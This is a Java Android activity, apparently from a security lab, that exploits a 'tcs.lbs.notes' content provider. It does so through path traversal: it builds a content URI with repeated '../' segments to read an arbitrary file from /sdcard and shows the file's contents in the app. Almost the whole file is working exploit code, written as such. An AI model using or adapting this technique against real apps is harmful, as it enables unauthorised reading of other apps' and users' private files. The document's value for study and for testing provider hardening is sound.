package tcs.lbs.contentproviderexploit;


import androidx.appcompat.app.AppCompatActivity;

import android.content.ContentResolver;
import android.net.Uri;
import android.os.Bundle;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;

public class MainActivity extends AppCompatActivity
{
    EditText queryEditText;
    TextView resultTextView;

    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        queryEditText = findViewById(R.id.query_editText);
        resultTextView = findViewById(R.id.resultTextView);
        queryEditText.setText("ExternalTextFile.txt");
    }

    public void queryContentProvider_onClicked(android.view.View view) {
        try {
            // Get the file name from the EditText
            String fileName = queryEditText.getText().toString();

            // Create a content URI for the Notes app content provider
            // The authority is likely "tcs.lbs.notes.provider"
            // We'll use the path traversal attack by prepending "../" to the filename
            // This will cause the content provider to look outside its intended directory
            Uri contentUri = Uri.parse("content://tcs.lbs.notes/../../../../../sdcard/" + fileName);

            // Get a ContentResolver to query the content provider
            ContentResolver contentResolver = getContentResolver();

            // Open an input stream to read the file via the content provider
            InputStream inputStream = contentResolver.openInputStream(contentUri);

            // Read the contents of the file
            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                stringBuilder.append(line).append("\n");
            }

            // Close the streams
            reader.close();
            inputStream.close();

            // Display the contents in the TextView
            resultTextView.setText(stringBuilder.toString());

            Toast.makeText(this, "File read successfully!", Toast.LENGTH_SHORT).show();

        } catch (Exception e) {
            // Display error message
            resultTextView.setText("Error: " + e.getMessage());
            Toast.makeText(this, "Error reading file: " + e.getMessage(), Toast.LENGTH_LONG).show();
            e.printStackTrace();
        }
    }
}

